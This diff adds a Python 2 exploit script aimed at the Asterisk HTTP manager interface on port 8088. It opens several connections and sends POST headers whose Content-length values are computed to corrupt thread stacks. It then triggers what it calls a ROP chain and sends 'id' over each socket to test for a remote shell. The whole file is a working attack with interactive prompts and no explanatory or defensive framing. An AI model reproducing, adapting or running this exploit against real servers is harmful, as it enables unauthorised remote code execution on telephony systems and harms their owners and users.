@@ -1,0 +1,179 @@
+#!/usr/bin/python
+import socket
+import time
+import sys
+
+SLEEP_TIME = 1
+
+def send_header(sock,content_length):
+  header = ("POST /asterisk/manager HTTP/1.0\r\n"+
+            "Host: localhost\r\n"+
+            "Content-length: "+str(content_length)+"\r\n"+
+            "\r\n")
+  sock.send(header)
+  time.sleep(SLEEP_TIME)
+
+def new_conn():
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect( ("localhost", 8088) )
+
+  time.sleep(SLEEP_TIME)
+  return s
+
+def close_conn(s):
+  s.close()
+  time.sleep(SLEEP_TIME)
+
+def do_attack():
+  s7 = new_conn()
+  s6 = new_conn()
+  s5 = new_conn()
+  s4 = new_conn()
+  s3 = new_conn()
+  s2 = new_conn()
+  s1 = new_conn()
+
+  stacksize = 0x7c000
+  offset = 0x3e000 # in first stack
+  
+  send_header(s1,offset)
+
+  send_header(s2,offset + (stacksize * 1) + 0x40)
+  close_conn(s2)
+  raw_input("Check FD of next conn! Press Enter to create conn")
+  s2 = new_conn()
+  raw_input("Check FD of next conn! Check new FD!")
+
+  send_header(s2,offset + (stacksize * 1) + 0x40 - 0x30)
+  send_header(s3,offset + (stacksize * 2) + 0x40 - 0x30 - 0x50)
+  send_header(s4,offset + (stacksize * 3) + 0x40 - 0x30 - 0x50 - 0xA0)
+  send_header(s5,offset + (stacksize * 4) + 0x40 - 0x30 - 0x50 - 0xA0 - 0x50)
+  send_header(s6,offset + (stacksize * 5) + 0x40 - 0x30 - 0x50 - 0xA0 - 0x50 - 0xA0)
+
+  send_header(s7,offset + (stacksize * 6) + 0x40 + 0x70)
+
+  s7.send('\0\0\0\0\0\0\0\0')
+  time.sleep(SLEEP_TIME)
+
+  close_conn(s7)
+
+  raw_input("Press Enter to close connection s1 and start executing the rop chain")
+  close_conn(s1)
+
+  raw_input("Try s2 ..")
+  s = s2
+  time.sleep(SLEEP_TIME)
+  s.settimeout(1)
+  s.send("id\n")
+  try:
+    msg = s.recv(4096)
+    print 'msg:', msg
+  except socket.timeout, e:
+    err = e.args[0]
+    # this next if/else is a bit redundant, but illustrates how the
+    # timeout exception is setup
+    if err == 'timed out':
+      print 'recv timed out, retry later'
+    else:
+      print 'e:', e
+  except socket.error, e:
+    print 'socket.error:', e
+
+  raw_input("Try s3 ..")
+  s = s3
+  time.sleep(SLEEP_TIME)
+  s.settimeout(1)
+  s.send("id\n")
+  try:
+    msg = s.recv(4096)
+    print 'msg:', msg
+  except socket.timeout, e:
+    err = e.args[0]
+    # this next if/else is a bit redundant, but illustrates how the
+    # timeout exception is setup
+    if err == 'timed out':
+      print 'recv timed out, retry later'
+    else:
+      print 'e:', e
+  except socket.error, e:
+    print 'socket.error:', e
+
+  raw_input("Try s4 ..")
+  s = s4
+  time.sleep(SLEEP_TIME)
+  s.settimeout(1)
+  s.send("id\n")
+  try:
+    msg = s.recv(4096)
+    print 'msg:', msg
+  except socket.timeout, e:
+    err = e.args[0]
+    # this next if/else is a bit redundant, but illustrates how the
+    # timeout exception is setup
+    if err == 'timed out':
+      print 'recv timed out, retry later'
+    else:
+      print 'e:', e
+  except socket.error, e:
+    print 'socket.error:', e
+
+  raw_input("Try s5 ..")
+  s = s5
+  time.sleep(SLEEP_TIME)
+  s.settimeout(1)
+  s.send("id\n")
+  try:
+    msg = s.recv(4096)
+    print 'msg:', msg
+  except socket.timeout, e:
+    err = e.args[0]
+    # this next if/else is a bit redundant, but illustrates how the
+    # timeout exception is setup
+    if err == 'timed out':
+      print 'recv timed out, retry later'
+    else:
+      print 'e:', e
+  except socket.error, e:
+    print 'socket.error:', e
+
+  raw_input("Try s6 ..")
+  s = s6
+  time.sleep(SLEEP_TIME)
+  s.settimeout(1)
+  s.send("id\n")
+  try:
+    msg = s.recv(4096)
+    print 'msg:', msg
+  except socket.timeout, e:
+    err = e.args[0]
+    # this next if/else is a bit redundant, but illustrates how the
+    # timeout exception is setup
+    if err == 'timed out':
+      print 'recv timed out, retry later'
+    else:
+      print 'e:', e
+  except socket.error, e:
+    print 'socket.error:', e
+
+  raw_input("Try s7 ..")
+  s = s7
+  time.sleep(SLEEP_TIME)
+  s.settimeout(1)
+  s.send("id\n")
+  try:
+    msg = s.recv(4096)
+    print 'msg:', msg
+  except socket.timeout, e:
+    err = e.args[0]
+    # this next if/else is a bit redundant, but illustrates how the
+    # timeout exception is setup
+    if err == 'timed out':
+      print 'recv timed out, retry later'
+    else:
+      print 'e:', e
+  except socket.error, e:
+    print 'socket.error:', e
+
+  raw_input("Press Enter to quit..")
+
+do_attack()
